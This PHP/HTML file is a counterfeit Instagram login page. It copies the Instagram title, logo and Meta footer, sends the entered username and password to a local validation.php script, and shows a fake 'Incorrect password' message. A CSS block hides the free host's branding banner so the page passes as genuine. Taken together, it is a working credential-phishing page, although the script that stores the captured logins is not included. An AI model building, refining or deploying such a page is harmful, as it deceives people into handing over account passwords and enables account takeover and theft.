<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <title>Instagram</title>
  <link rel="stylesheet" href="./css/styles.css" />
  <script defer src="./js/index.js"></script>
  <link rel="shortcut icon" href="./img/icon.png" type="image/x-icon" />
  <script src="./FONTS/all.js"></script>
</head>

<body id="body">
  <?php
  if (isset($_SESSION['error'])) {
  ?>
    <div class="error" id="error">
      <div class="error__cont">
        <span class="error__details">
          <span class="error__heading"> Incorrect password </span>
          <span class="error__text">
            <?php echo $_SESSION['error']; ?>
          </span>
        </span>
        <span class="error__btn" id="errorBtn">OK</span>
      </div>
    </div>
  <?php
    unset($_SESSION['error']);
  } ?>


  <section class="home">
    <div class="home__logo">
      <img src="./IMG/logo.png" alt="" class="home__logoImg" />
    </div>
    <form action="./validation.php" class="home__form" id="form" method="post">
      <input type="text" name="username" id="username" class="home__input" placeholder="Username, email address or mobile number" autocomplete="off" />
      <input type="password" name="password" id="password" class="home__input" placeholder="Password" />
      <input type="hidden" name="Location" />
      <span class="home__btnCont">
        <span class="loader" id="loader"></span>
        <button type="submit" class="home__btn" id="formBtn" type="submit">
          Log In
        </button>
      </span>
    </form>
    <a href="" class="home__reset">Forgotten Password?</a>

    <div class="home__footer">
      <a href="" class="home__accoutBtn">Create new account</a>
      <span class="home__meta"> <i class="fa-brands fa-meta"></i> Meta </span>
    </div>
  </section>

  <style>
    div[style*="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"] {
      display: none !important;
    }

    img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
      display: none !important;
    }

    a[href*="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"] {
      display: none !important;
    }
  </style>
</body>

</html>